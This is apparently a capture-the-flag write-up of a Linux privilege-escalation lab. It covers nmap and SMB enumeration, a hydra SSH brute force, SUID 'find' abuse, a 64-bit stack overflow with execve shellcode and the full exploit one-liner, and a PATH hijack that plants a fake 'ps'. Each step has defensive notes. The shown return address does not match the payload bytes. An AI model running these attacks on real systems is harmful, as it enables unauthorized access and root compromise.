# Binex — SUID Abuse, Buffer Overflow & PATH Manipulation

**Author:** XENOS
**Category:** Linux Privilege Escalation
**Techniques covered:** SSH Brute Force, SMB Enumeration, SUID Binary Exploitation, Stack-based Buffer Overflow (x64), PATH Hijacking

---

## Attack Chain Summary

1. **Enumeration** — Full TCP port scan with `nmap`, followed by SMB enumeration with `enum4linux` to identify valid usernames.
2. **Initial Access** — Brute-forced SSH credentials for user `tryhackme` using `hydra` with the `rockyou.txt` wordlist.
3. **PrivEsc #1 (SUID)** — Found a SUID-bit `find` binary owned by user `des` and abused it via GTFOBins to spawn a privileged shell.
4. **PrivEsc #2 (Buffer Overflow)** — Exploited a custom 64-bit binary (`bof64`) vulnerable to stack buffer overflow, manually calculating the offset, injecting shellcode, and hijacking `RIP` to gain code execution as `kel`.
5. **PrivEsc #3 (PATH Manipulation)** — Abused a SUID root binary that called `system("ps")` without an absolute path, hijacking the `PATH` variable to execute a malicious `ps` and obtain a root shell.

---

## 1. Enumeration

### Theory
Before touching anything, the goal of enumeration is to build a map of attack surface: open ports, running services, and any leaked usernames or shares. `nmap` gives us the door list; `enum4linux` (a wrapper around several SMB enumeration tools like `smbclient`, `rpcclient`, `net`) tells us what's behind the SMB door specifically — null sessions, user lists, shares, OS info, etc. SMB null session enumeration is a classic Linux/Windows misconfiguration where anonymous users can pull internal information without credentials.

**Detection note:** A full `-p-` scan combined with SMB enumeration is noisy and easily flagged by IDS/IPS — full port scans and anonymous SMB session attempts are common detection signatures in SOC environments.

### Practical
```bash
nmap -T4 -p- --min-parallelism 100 --max-retries 2 10.10.147.155
enum4linux 10.10.74.134
```

**Result:** SMB enumeration revealed 4 local users on the box, including `tryhackme`, `des`, and `kel`.

---

## 2. Initial Access — SSH Brute Force

### Theory
With valid usernames in hand but no passwords, the next logical step is credential brute forcing. `hydra` is a parallelized login cracker that supports dozens of protocols including SSH. Pairing it with `rockyou.txt` (a leaked password list from the 2009 RockYou breach, ~14 million unique passwords) is a standard first attempt against weak/reused passwords.

**Why this works:** SSH does not natively rate-limit or lock out accounts after failed attempts unless explicitly configured (e.g., `fail2ban`, `MaxAuthTries`, or PAM lockout modules). Without these protections, brute forcing is only a matter of time and wordlist quality.

**Detection note:** A flood of failed SSH auth attempts from a single source IP in `/var/log/auth.log` is one of the most common and easiest-to-catch attack signatures — `fail2ban` or SSH key-only authentication would have stopped this entirely.

### Practical
```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.74.134:22 -v -f -V -t 15
```

**Result:** `tryhackme:thebest` — valid credentials, SSH access obtained.

---

## 3. Privilege Escalation #1 — SUID Binary Abuse (`find`)

### Theory
SUID (Set User ID) is a Linux permission bit that makes a binary execute with the privileges of its **owner**, not the user running it. If a binary with the SUID bit set is owned by a higher-privileged user and has a known "breakout" function (like spawning a shell), any user who can execute it inherits that owner's privileges temporarily. [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be abused this way to bypass local security restrictions.

**Why this works:** `find` supports an `-exec` flag to run arbitrary commands on matched files. If `find` itself is SUID, the spawned process also runs with the owner's privileges — effectively turning a file-search utility into a privilege escalation primitive.

**Detection note:** Auditing SUID binaries regularly (`find / -perm -4000`) and removing the bit from non-essential binaries is the primary defense. EDR tools can also flag `find -exec /bin/sh` as a suspicious child-process pattern.

### Practical
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# /usr/bin/find found with SUID bit, owned by 'des'

/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Result:** Shell spawned with `des` privileges. User flag captured.

---

## 4. Privilege Escalation #2 — Stack-Based Buffer Overflow (x64)

### Theory
A buffer overflow happens when a program writes more data into a fixed-size buffer than it was allocated for, overwriting adjacent memory. On the stack, this adjacent memory eventually includes the **saved return address (`RIP`)** — the address the CPU jumps to once the current function returns. If an attacker controls what gets written past the buffer, they control what address `RIP` points to next, effectively hijacking program execution.

The general exploitation flow:
- **Confirm the crash** — feed oversized input until the program segfaults, proving the overflow exists.
- **Find the exact offset** — the precise number of bytes needed to reach and fully overwrite `RIP`, found here manually (counting `0x41` bytes — hex for `'A'`) and cross-verified using Metasploit's `pattern_create.rb` / `pattern_offset.rb` (a cyclic, non-repeating pattern lets you instantly find any offset by checking which fragment landed in `RIP`).
- **Build the payload** — `[junk/NOP padding] + [shellcode] + [padding to offset] + [overwritten RIP]`. NOP (`\x90`, "No Operation") sleds are used as a landing zone — if execution lands anywhere inside the NOP sled, it slides forward harmlessly until it reaches the actual shellcode, giving some tolerance for an imprecise return address.
- **Pick a return address** — an address that, when execution jumps there, lands inside the NOP sled/shellcode region on the stack.
- **Respect endianness** — x86/x64 is little-endian, meaning the least significant byte is stored first in memory. A target address must be byte-reversed using something like Python's `struct.pack("<Q", addr)` before being placed in the payload, or `RIP` won't be overwritten with the intended value.

**Why this works:** The binary was compiled without modern stack protections — no stack canary, and likely no ASLR/NX in effect during this exercise — allowing predictable stack addresses and direct shellcode execution from the stack itself.

**Detection note:** Stack canaries (`-fstack-protector`), ASLR, NX/DEP bits, and compiling with `-fPIE` are the standard mitigations. In production, any of these alone would have broken this exact exploit chain.

### Practical

**Step 1 — Confirm the overflow:**
```bash
# Sending 700 bytes causes a segfault, confirming overflow beyond the 600-byte buffer
```

**Step 2 — Find the offset (manual method):**
```bash
gdb ./bof
run
# Feed increasing 'A' counts and inspect RIP via `info registers`
# RIP fully overwritten with 0x41414141... at 621 bytes
# 621 - 5 (leftover non-A bytes) = 616-byte offset to RIP
```

**Step 2 (alt) — Find the offset (Metasploit pattern tools):**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
# Feed pattern, crash, read RSP/RIP value (e.g. 0x75413575)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x75413575
# Offset confirmed: matches manual calculation
```

**Step 3 — Calculate shellcode size:**
```bash
echo -ne "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" | wc -c
# 24 bytes -> 616 - 24 = 592 bytes available for padding
```

**Step 4 — Locate a usable return address inside GDB:**
```bash
# Send: 'A'*492 + shellcode + 'A'*100, inspect stack to find an address landing in the NOP/shellcode region
# Chosen address: 0x7fffffffe3f8
```

**Step 5 — Convert address for little-endian:**
```python
from struct import pack
print(pack("<Q", 0x7fffffffe3f8))
```

**Step 6 — Final exploit payload:**
```bash
(python -c "print('\x90'*(616 - 24 - 100) + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*100 + '\x08\xe3\xff\xff\xff\x7f\x00\x00');"; cat) | ./bof
```

**Result:** Root-of-shell-equivalent payload execution as user `kel`. Shell obtained via direct stack execution.

---

## 5. Privilege Escalation #3 — PATH Manipulation

### Theory
When a C program calls `system("ps")` (or any command without a full path like `/bin/ps`), the operating system resolves the binary name by searching each directory listed in the `PATH` environment variable, **in order**, until a match is found. If a SUID root binary does this insecurely, and an attacker controls a directory listed earlier in `PATH` than the legitimate binary's location, the attacker can plant a malicious file with the same name and have it executed with root privileges instead.

**Why this works:** The binary is SUID root (sets `setuid(0)`/`setgid(0)` before calling `system()`), but trusts the calling user's environment (`PATH`) rather than hardcoding an absolute path. This is a classic insecure-environment-trust vulnerability — the binary inherits elevated privileges but still uses attacker-controllable input (the shell environment) to decide what code to run.

**Detection note:** The fix is trivial and well known — always call commands with their absolute path (`/bin/ps` instead of `"ps"`) inside privileged code, and never trust `PATH`, `LD_PRELOAD`, or other environment variables in a SUID context.

### Practical
```bash
# Identify writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Hijack PATH
echo $PATH
export PATH=/tmp:$PATH
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps

# Trigger the vulnerable SUID binary
./exe
```

**Result:** Malicious `ps` executed in place of the legitimate binary → root shell obtained.

---

## Lessons Learned

- **Weak SSH credentials + no rate limiting** turned simple enumeration into full initial access — credential hygiene and brute-force protection (`fail2ban`, key-only auth) are non-negotiable basics.
- **Unaudited SUID binaries** are a recurring and easy win for attackers; routine SUID audits (`find / -perm -4000`) should be part of any hardening checklist.
- **Stack-based buffer overflows** are still highly relevant for understanding low-level exploitation, even though modern mitigations (canaries, ASLR, NX) make them far harder in real-world binaries — this lab strips those protections away specifically to teach the underlying mechanics of memory corruption.
- **Trusting environment variables in privileged code** (PATH hijacking) is a deceptively simple but devastating mistake — always use absolute paths in SUID/root-context code.
- Manual offset-calculation (counting `0x41` bytes in `RIP`) builds real understanding of the stack layout, while pattern_create/pattern_offset tooling is what you'd actually use day-to-day once the concept is internalized.

---

**XENOS**
GitHub: [obadahamed](https://github.com/obadahamed)
Portfolio: [obadahamed.github.io](https://obadahamed.github.io)
